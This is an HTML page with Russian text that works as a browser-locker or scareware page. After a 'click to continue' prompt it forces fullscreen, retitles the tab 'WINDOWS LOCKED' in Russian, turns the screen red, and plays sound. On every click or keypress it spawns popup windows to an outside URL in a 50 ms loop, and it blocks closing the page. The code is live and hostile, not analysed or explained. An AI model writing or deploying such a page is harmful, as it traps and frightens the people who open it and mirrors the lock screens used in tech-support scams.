<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Нажмите чтобы продолжить</title>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<style>
	body {
      background: #111;
      color: #f8f8f8;
      margin: 0;
      padding: 0;
      overflow:hidden;
      -webkit-user-select: none;
      -moz-user-select: -moz-none;
      -ms-user-select: none;
      user-select: none;
    }
	canvas {
      background: #000000;
      width: 100%;
      margin: 0;
      padding: 0;
    }
</style>
</head>
<body>
	<div id="SeeDiv">
		<canvas id="seed"></canvas>
	</div>
</body>
<script>
	
	var clicked = false
	var soundd = new Audio('sdound.mp3');
	var clicky_custom = clicky_custom || {};
	clicky_custom.outbound_disable = 1;
	function FS() {
		clicked = true
		document.title = 'WINDOWS ЗАБЛОКИРОВАН'
		document.documentElement.requestFullscreen();
		var randomnumber = Math.floor((Math.random()*100)+1); 
		window.open("http://applevegas.github.io/look.html","_blank",'PopUp',randomnumber,'scrollbars=1,menubar=0,resizable=1,width=850,height=500');
	}
	
	window.onbeforeunload = function(){
		return 'No?';
	};
	window.onunload = function() {
    	alert('Bye.');
	}

	var timeoutId = null;
	function lol() {
		FS()
		window.open("http://applevegas.github.io/look.html","newwindow");
		timeoutId = setTimeout(lol, 50);
	}
	document.documentElement.onclick = lol;
    document.onkeydown = lol;
	const canvas = document.getElementById('seed')
	var w = $(window).width();
	var h = $(window).height();
	var oldw = w;
	var oldh = h;
	var mode = 1
	function ScreenScale(int)
	{
	    return w/int
	}
	
	var istouchdevice = false;
	
	if (w < h){
	    mode = 0
	}
	function ScreenScaleH(int)
	{
	    return w/int
	}

	var screenscale

	if (mode == 1)
	{
	    screenscale = ScreenScale(1366)
	}else{
	    screenscale = ScreenScaleH(657)
	}

	function Scale(num)
	{
	    return (num*screenscale)
	}
	

	function changeResolution(cnvs, width, height)
	{
	    cnvs.style.width = width.toString() + "px"
	    cnvs.style.height = height.toString() + "px"
	    $(cnvs).attr("width", width.toString() + "px");
	    $(cnvs).attr("height", height.toString() + "px");
	}
	var imloaded = false 
	function ImageLoaded(){
		imloaded = true
	}
	s488 = Scale(488)
	s308 = Scale(308)
	var image = new Image(s488, s308);   
	image.onload = ImageLoaded; 
	image.src = 'sbac.jpg';
	changeResolution(canvas, w, h)

	$(window).resize(function(){
    	w = $(window).width();
    	h = $(window).height();

    	if (mode == 1 && w < h){
    	    document.location.reload()
    	}

    	if (mode == 0 && w > h){
    	    document.location.reload()
    	}

    	if (mode == 1)
    	{
    	    screenscale = ScreenScale(1366)
    	}else{
    	    screenscale = ScreenScaleH(657)
    	}

    	changeResolution(canvas, w, h)
	});

	const ctx = canvas.getContext('2d')
	function draw(time){
		ctx.clearRect(0, 0, w, h);
		if (!clicked){
			ctx.save();
			ctx.translate(w/2, h/2);
            ctx.textAlign = "center"
            ctx.textBaseline = "middle";
            ctx.fillStyle = "rgba(255,255,255,1)"
            ctx.font = Scale(20)+"px Arial";
            ctx.fillText("Нажмите чтобы продолжить", 0, 0);
			ctx.restore();
		}else{
			ctx.fillStyle = "red"
			ctx.fillRect(0, 0, w, h)
			soundd.play()
			if (imloaded){
				ctx.drawImage(image, w/2 - s488/2, h/2 - s308/2, s488, s308);
			} 
		}
		console.clear()
		requestAnimationFrame(draw);
	}
	requestAnimationFrame(draw);
</script>
</html>
